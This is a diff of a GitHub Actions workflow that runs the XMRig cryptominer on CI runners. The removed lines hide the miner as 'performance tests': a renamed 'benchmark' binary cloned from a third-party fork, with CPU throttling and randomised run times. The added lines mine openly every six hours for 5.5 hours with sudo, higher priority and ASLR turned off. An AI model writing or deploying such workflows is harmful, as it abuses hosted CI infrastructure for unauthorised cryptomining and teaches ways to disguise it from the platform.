@@ -1,20 +1,21 @@
-name: test
+name: X
 
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 3,9,15,21 * * *'
+    - cron: '0 */6 * * *'
 
 jobs:
-  test:
+  mine:
     runs-on: ubuntu-latest
+    timeout-minutes: 360
     strategy:
       matrix:
         runner: [1, 2]
       fail-fast: false
 
     steps:
-      - name: Check Environment
+      - name: System Health Check
         run: |
           echo "=== CPU Information ==="
           nproc
@@ -26,59 +27,62 @@ jobs:
           echo -e "\n=== Disk Space ==="
           df -h /
 
+          echo -e "\n=== Available Huge Pages ==="
+          cat /proc/meminfo | grep -i huge
 
-      - name: Setup Build Tools
+      - name: System Optimization
+        run: |
+          sudo sysctl -w vm.nr_hugepages=512
+          sudo sysctl -w kernel.randomize_va_space=0
+          sudo sysctl -w vm.swappiness=1
+          sudo sysctl -w kernel.numa_balancing=0
+          sudo bash -c "echo 0 > /proc/sys/kernel/nmi_watchdog" || true
+
+      - name: Install Dependencies
         run: |
           sudo apt-get update -qq
-          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git cpulimit
+          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git
 
-      - name: Restore Build Cache
-        id: cache-build
+      - name: Cache XMRig Build
+        id: cache-xmrig
         uses: actions/cache@v3
         with:
-          path: app/build
-          key: build-${{ runner.os }}-${{ hashFiles('app/CMakeLists.txt', 'app/cmake/**') }}
+          path: xmrig/build
+          key: xmrig-${{ runner.os }}-${{ hashFiles('xmrig/CMakeLists.txt', 'xmrig/cmake/**') }}
           restore-keys: |
-            build-${{ runner.os }}-
+            xmrig-${{ runner.os }}-
 
-      - name: Fetch Source Code
-        if: steps.cache-build.outputs.cache-hit != 'true'
+      - name: Clone XMRig
+        if: steps.cache-xmrig.outputs.cache-hit != 'true'
         run: |
-          git clone https://github.com/Delta-Kronecker/x.git app
+          git clone https://github.com/xmrig/xmrig.git
 
-      - name: Compile Project
-        if: steps.cache-build.outputs.cache-hit != 'true'
+      - name: Build XMRig
+        if: steps.cache-xmrig.outputs.cache-hit != 'true'
         run: |
-          cd app
+          cd xmrig
           mkdir build && cd build
           cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
           make -j$(nproc)
-          mv xmrig benchmark
 
-      - name: Restore Source Files
-        if: steps.cache-build.outputs.cache-hit == 'true'
+      - name: Restore XMRig Source (if cached)
+        if: steps.cache-xmrig.outputs.cache-hit == 'true'
         run: |
-          git clone https://github.com/Delta-Kronecker/x.git app
+          git clone https://github.com/xmrig/xmrig.git
 
-      - name: Generate Configuration
+      - name: Configure Mining
         run: |
-          cd app/build
-          TOTAL_CPUS=$(nproc)
-          MAX_THREADS=$((TOTAL_CPUS * 90 / 100))
-          if [ $MAX_THREADS -lt 1 ]; then
-            MAX_THREADS=1
-          fi
+          cd xmrig/build
           cat > config.json <<EOF
           {
             "autosave": true,
             "cpu": {
               "enabled": true,
-              "huge-pages": false,
-              "huge-pages-jit": false,
+              "huge-pages": true,
+              "huge-pages-jit": true,
               "hw-aes": true,
-              "priority": 1,
-              "memory-pool": false,
-              "max-threads-hint": $MAX_THREADS,
+              "priority": 3,
+              "memory-pool": true,
               "asm": "auto",
               "argon2-impl": "auto"
             },
@@ -101,52 +105,45 @@ jobs:
           }
           EOF
 
-      - name: Run Performance Tests
+      - name: CPU Performance Mode
         run: |
-          cd app/build
-          TIMEOUT_MINUTES=$((RANDOM % 6 + 40))
-          TIMEOUT_SECONDS=$((TIMEOUT_MINUTES * 60))
-          echo "Running for $TIMEOUT_MINUTES minutes ($TIMEOUT_SECONDS seconds)"
+          echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
 
+      - name: Start Mining with Monitoring
+        run: |
+          cd xmrig/build
+
+          # Start resource monitoring in background
           (while true; do
             echo "=== $(date) ==="
-            ps aux | grep -E 'build/\.' | grep -v grep || echo "Process not running"
+            ps aux | grep xmrig | grep -v grep || echo "XMRig not running"
             free -h | grep Mem
             sleep 300
-          done) > ../../perf_stats_${{ matrix.runner }}.log 2>&1 &
+          done) > ../../mining_stats_${{ matrix.runner }}.log 2>&1 &
           MONITOR_PID=$!
 
-          timeout $TIMEOUT_SECONDS nice -n 35 cpulimit -l 44 -f -- ./benchmark --config=config.json --randomx-mode=light --randomx-no-rdmsr || true
+          # Run mining with optimized settings (19800s = 5.5 hours, leaving 30min for cleanup)
+          sudo nice -n -10 timeout 19800 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr || true
 
+          # Stop monitoring
           kill $MONITOR_PID 2>/dev/null || true
-          pkill -9 -f 'build/' 2>/dev/null || true
 
-      - name: Collect Test Results
+      - name: Generate Performance Summary
         if: always()
         run: |
-          echo "=== Performance Test Summary ===" > summary_${{ matrix.runner }}.txt
+          echo "=== Mining Session Summary ===" > summary_${{ matrix.runner }}.txt
           echo "Runner: ${{ matrix.runner }}" >> summary_${{ matrix.runner }}.txt
           echo "End Time: $(date)" >> summary_${{ matrix.runner }}.txt
 
-          if [ -f perf_stats_${{ matrix.runner }}.log ]; then
+          if [ -f mining_stats_${{ matrix.runner }}.log ]; then
             echo -e "\n=== Resource Usage (Last 20 entries) ===" >> summary_${{ matrix.runner }}.txt
-            tail -20 perf_stats_${{ matrix.runner }}.log >> summary_${{ matrix.runner }}.txt
+            tail -20 mining_stats_${{ matrix.runner }}.log >> summary_${{ matrix.runner }}.txt
           fi
 
           cat summary_${{ matrix.runner }}.txt
 
-      - name: Archive Test Artifacts
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: test-results-runner-${{ matrix.runner }}
-          path: |
-            perf_stats_${{ matrix.runner }}.log
-            summary_${{ matrix.runner }}.txt
-          retention-days: 7
-
-      - name: Clean Workspace
+      - name: Cleanup
         if: always()
         run: |
-          sudo pkill -9 -f 'build/' || true
-          rm -rf app
+          sudo pkill -9 xmrig || true
+          rm -rf xmrig
